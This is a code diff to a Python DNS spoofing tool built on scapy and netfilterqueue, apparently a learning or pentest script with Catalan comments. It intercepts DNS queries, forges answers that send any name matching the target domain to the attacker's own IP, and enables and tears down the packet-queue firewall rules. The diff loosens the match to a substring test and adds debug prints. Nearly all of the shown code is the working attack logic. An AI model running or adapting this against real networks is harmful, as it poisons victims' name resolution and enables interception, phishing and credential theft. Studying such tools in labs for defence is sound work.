@@ -19,33 +19,30 @@ def get_arguments():
     return options.domain, options.interface
 
 def process_packet(packet):
+
+    print(packet)
+
     scapy_packet = scapy.IP(packet.get_payload())
 
     if scapy_packet.haslayer(scapy.DNS) and scapy_packet.haslayer(scapy.DNSQR):
         qname = scapy_packet[scapy.DNSQR].qname.decode()
 
-        # Normalitza qname i domain per comparar sense el punt final
-        qname_clean = qname.rstrip('.').lower()
-        domain_clean = DOMAIN.lower().rstrip('.')
+        print(scapy_packet)
 
-        if domain_clean == qname_clean:
+        if DOMAIN.lower() in qname.lower():
             show_message("Envenenando el dominio:", "minus", DOMAIN)
+            
+            # Crear resposta
+            answer = scapy.DNSRR(rrname=qname, rdata=IP)
 
-            # Construeix la resposta
-            answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata=IP)
+            print(answer)
 
-            # Posa el flag QR a 1 (resposta)
-            scapy_packet[scapy.DNS].qr = 1
+            scapy_packet[scapy.DNS].qr = 1  # És resposta
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
-            scapy_packet[scapy.DNS].qdcount = 1
-            scapy_packet[scapy.DNS].nscount = 0
-            scapy_packet[scapy.DNS].arcount = 0
-            scapy_packet[scapy.DNS].rcode = 0
-            # Manté la mateixa ID
-            # Resposta sobreescriu només el camp an i anc
+            scapy_packet[scapy.DNS].rcode = 0  # No error
 
-            # Elimina camps per recalcular checksum i longitud
+            # Eliminar camps per forçar recalcul
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].len
@@ -55,18 +52,17 @@ def process_packet(packet):
 
     packet.accept()
 
-
-
 def main():
 
     check_root()
-    setup_signal_handler()
+    setup_signal_handler(disable_rules)
     show_message("Executing:", "info", "DNS Spoofer")
 
     global DOMAIN, interface, IP
     DOMAIN, interface = get_arguments()
     IP = get_ip(interface)
 
+    enable_rules()
     setup_nfqueue()
 
     queue = netfilterqueue.NetfilterQueue()
